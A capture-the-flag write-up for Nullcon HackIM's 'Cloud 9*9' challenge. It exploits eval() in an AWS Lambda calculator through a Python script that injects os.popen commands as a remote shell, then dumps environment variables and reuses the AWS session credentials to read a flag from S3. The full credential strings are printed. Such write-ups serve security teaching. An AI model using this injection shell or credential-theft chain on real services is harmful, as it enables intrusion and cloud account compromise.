## Nullcon HackIM CTF

### Chall name : Cloud 9*9

### Description

```  
Our new serverless calculator can solve any calulation super fast.

** The Cloud security challenges are provided by SEC Consult **

http://3.64.214.139/  
```

## Soln

#### shell.py

- I made a simple py script to get better shell experience

```py  
import requests  
import json

def main():  
   print('\n Shell \n')  
   url = 'http://3.64.214.139/calc'  
   cmd = ''  
   while 1:  
       if cmd == 'q':  
           break  
       else:  
           try:  
               cmd = input('$')  
               payload = f"__import__('os').popen('{cmd}').read()"  
               data = {'input': f'{payload}'}  
               #print(data)  
               r = requests.post(url, data=json.dumps(data), headers={"Content-Type":"application/json"})  
               f = json.loads(r.text)  
               print(f['result'])  
#                print('\n')  
           except:  
               print("Failed with command : ", cmd)

if __name__ == '__main__':  
   main()  
  
```

### Bucket link

```bash

┌─[dragon@msi] - [~/CTFs/nullconGoa/cloud] - [1343]  
└─[$] python3 cloud1.py

Shell

$ls  
lambda-function.py

$cat lambda-function.py  
import json

def lambda_handler(event, context):  
   return {  
       'result' : eval(event['input'])  
       #flag in nullcon-s3bucket-flag4 ......  
   }

```  
- So the bucket link is `nullcon-s3bucket-flag4`  
- After checking the env variables we get session tokens of AWS 

```bash

┌─[dragon@msi] - [~/CTFs/nullcon/cloud] - [1332]  
└─[$] python3 cloud1.py
[21:58:34]

Shell

$env  
AWS_LAMBDA_FUNCTION_VERSION=$LATEST  
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjECcaDGV1LWNlbnRyYWwtMSJIMEYCIQC6oZgisKGVN48XYK9jYz/NwFFbrG4oXh0CHjH9S2U70gIhAM+Iv14HcaFM/U17O3WPC0kHcwaWaKTK3HKTe2swvBLMKoIDCJD//////////wEQABoMNzQzMjk2MzMwNDQwIgz2sfpeyR1fkrtfVEgq1gKjj5LtCXwBL+zeOWu2MsoOOJAaoXsDx9lZTG4Yn3bV9uifCMiyuNJCNlrT59C6LkoGD6SnPF/VMtpbvKib8dKczhCikfaYM/5E93hw675sIeEbf6W6JlNkVIslLQI+inaXdDh1zgkm+vtSstmYZdHw3++IPEn1npZ1a0zjrB944Zk1KxnVcd8qlCryOFLX/ITkJM+CLHafNZn1HAKArcBzzRUW09Am80FejpswA3/vC9BPJeLe4uxd/X4bqoQw98m2uMHUXmbbpSrO3Qwo6SMkRPI4+3fwVguAMtI8e5Vvr+wwURVc3SgQAiQm2HH4Gw3dEg0PkotxxD2pveHviDrFsXZ5OtfPHJe4uYEnetMGlEEhgCg1sSxLzHgDv3D8+FHuXfliMA+zNdy571N7PlWIGXFFM6F1J0BDJw0O7AAC3NxL9BkJ7l8ExZXSZywQ1Bcj/cn2aA0w8v/elwY6nQHg4zVxOD/yzVMcQa1fbVnwGSN7pbkpjmRm5yLdww4nD2gCnLTmSZj5QGpzkZiUJSoGMQAvnGrF/dk4n/0g6s7m32DTkvWb1RehAhGpTJXjb2xdXuiNYd7HUD2alxw6BXMd52XCLrdly9LpQbWxQhOwragCZ6SXe8FlKmzlRgHSDrEYAmGRHIakoSbbNOWp4bn1Uqh9ZpUa+iSfob7J  
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/lambda-calculator  
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib  
LAMBDA_TASK_ROOT=/var/task  
AWS_LAMBDA_LOG_STREAM_NAME=2022/08/13/[$LATEST]e5dfa04368e141b38e45bc313615778a  
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001  
AWS_EXECUTION_ENV=AWS_Lambda_python3.9  
AWS_LAMBDA_FUNCTION_NAME=lambda-calculator  
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000  
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin  
AWS_DEFAULT_REGION=eu-central-1  
PWD=/var/task  
AWS_SECRET_ACCESS_KEY=L3OWcJut4kv9pziGUVI6rFUbOnVTiCzkN58zv8Pw  
LAMBDA_RUNTIME_DIR=/var/runtime  
LANG=en_US.UTF-8  
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand  
TZ=:UTC  
AWS_REGION=eu-central-1  
AWS_ACCESS_KEY_ID=ASIA22D7J5LEA25ENS5X  
SHLVL=1  
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129  
_AWS_XRAY_DAEMON_PORT=2000  
PYTHONPATH=/var/runtime  
_X_AMZN_TRACE_ID=Root=1-62f7d139-5e225b122be9c5f21620330b;Parent=74923a6169c7998d;Sampled=0  
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR  
_HANDLER=lambda-function.lambda_handler  
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=512  
_=/usr/bin/env  
```

- Install aws client and configure with the above tokens  
- arch sytems : `sudo pacman -S aws-cli`

- config `~/.aws/credentials`

```bash

┌─[dragon@msi] - [~] - [1333]  
└─[$] cat ~/.aws/credentials

[default]  
aws_access_key_id = ASIA22D7J5LEA5GAM4VI  
aws_secret_access_key = VyZTbXGNGrYeDua0lHt11BlS3LSH9zGlklD39b15  
aws_session_token =
IQoJb3JpZ2luX2VjECYaDGV1LWNlbnRyYWwtMSJGMEQCICEk2UBWAbFZiyfVrm594L6LAjGA5tb01qx3jJoeil+gAiAW8Exec8JWJ17CjfKZqyd8mrDnjo2ksISAXFw/PdI9oCqCAwiP//////////8BEAAaDDc0MzI5NjMzMDQ0MCIMI19jwC+Y8iG0htCJKtYCk6Z+zkfSgyhqMhWpAAEK+mzRhwr165XMrFjndKrCHZbXA77EfA4Cd5LSsYMLt1MIfmxkhR55iOqNu+9QMfB/YIcHAAPIZAvVNJxZlq+iIGQ01jmTJ9Bg8Fe7pszCzlESF/W+LpWjsWKC+sUBBE0nSIrwToz6vxzibO0BVh1SK/ChN+3a4xrLCFyXQ0ln+GHkH3yeX5WCot8GMJEzLqJL5OjYkwan8jqw912yCeJ4LyQ5dfRYya8a5aC3e3ZimfG4NlYua8qRZLwZ7XS5slvu+G7RC2ltfESKVVQNMrIAEnet1lxf0J0BH6q9SWNtfXmMIt+qeWionr8u3rhGqJG7vvx5JwzVN+4w9yd+64LmzSueYtf1b/ub7xB7tdXfmi7yh0QcL7BEYf1CdV1yf6gGISDOFb8EFacyFj1NKmdo9LE5wu/VJstc55ajSLTq+qnllIYrjEqSMP/Z3pcGOp8BwkxUSpOQHWSY8ipdASD+XaJiD18xjjL4JHU1FaX4wPlW1YsY/BHjqzprzxPW6m/iCjkx1ko0ZoKYfM3Z+iNPlL5Z+x6eAbsY8qSLtaSl/oRJJwK99y2Ij94EY2J/uDX76oUJKUE2x2NB8KZgl7RH/zwQQqdu0tjezVpFl26YYme+oUInKS5fZlS33UY1EIho0BkmMOvVL+LOweAyi9k

```

### Flag

```  
┌─[dragon@msi] - [~] - [1336]  
└─[$] aws s3 ls s3://nullcon-s3bucket-flag4/  
2022-08-12 01:57:20         40 flag4.txt  
  
┌─[dragon@msi] - [~] - [1337]  
└─[$] aws s3 cp s3://nullcon-s3bucket-flag4/flag4.txt .  
download: s3://nullcon-s3bucket-flag4/flag4.txt to ./flag4.txt  
  
┌─[dragon@msi] - [~] - [1338]  
└─[$] cat flag4.txt  
ENO{L4mbda_make5_yu0_THINK_OF_ENVeryone}  
  
```

Original writeup
(https://gist.github.com/heapbytes/0fbf32340c6ffe4c2f357725d2faad14).